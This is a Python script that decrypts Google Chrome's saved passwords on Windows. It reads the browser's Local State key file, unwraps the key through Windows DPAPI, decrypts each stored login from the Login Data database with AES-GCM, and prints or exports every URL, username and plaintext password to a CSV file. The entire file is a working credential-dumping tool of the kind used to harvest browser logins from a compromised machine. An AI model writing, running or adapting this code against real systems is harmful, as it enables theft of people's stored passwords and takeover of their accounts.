import os
import json
import base64
import argparse
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv


parser = argparse.ArgumentParser()
parser.add_argument("-k","--key",help="Local State file containing the key",required=True)
parser.add_argument("-d","--db",help="Login data file containing the sqlite chrome database",required=True)
parser.add_argument("-o", "--output",help="Output file to export results")

args = parser.parse_args()

#GLOBAL CONSTANT
CHROME_PATH_LOCAL_STATE = os.path.normpath(args.key)
CHROME_PATH = os.path.normpath(args.db)

print(f"CHROME_PATH_LOCAL_STATE: {CHROME_PATH_LOCAL_STATE}")
print(f"CHROME_PATH: {CHROME_PATH}\n")


def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome database cannot be found")
        return None

def init_file(filename):
    with open(f'{filename}.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
        csv_writer = csv.writer(decrypt_password_file, delimiter=',')
        csv_writer.writerow(["index","url","username","password"])

def write_to_file(row,filename):
    with open(f'{filename}.csv', mode='a', newline='', encoding='utf-8') as decrypt_password_file:
        csv_writer = csv.writer(decrypt_password_file, delimiter=',')
        csv_writer.writerow(row)

if __name__ == '__main__':
    try:
        #(1) Get secret key
        secret_key = get_secret_key()
        #(2) Get ciphertext from sqlite database
        chrome_path_login_db = os.path.normpath(CHROME_PATH)
        conn = get_db_connection(chrome_path_login_db)

        init_file(args.output) if args.output else None

        if(secret_key and conn):
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for index,login in enumerate(cursor.fetchall()):
                url = login[0]
                username = login[1]
                ciphertext = login[2]
                if(url!="" and username!="" and ciphertext!=""):
                    #(3) Filter the initialisation vector & encrypted password from ciphertext 
                    #(4) Use AES algorithm to decrypt the password
                    decrypted_password = decrypt_password(ciphertext, secret_key)
                    print("Sequence: %d"%(index))
                    print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                    print("*"*50)
                    #(5) Save into CSV if option is set
                    write_to_file([index,url,username,decrypted_password],args.output) if args.output else None

            #Close database connection
            cursor.close()
            conn.close()
            #Delete temp login db
            os.remove("Loginvault.db")
            print(f"\nExported decrypted passwords to {args.output}.csv\n") if args.output else None
    except Exception as e:
        print("[ERR] %s"%str(e))
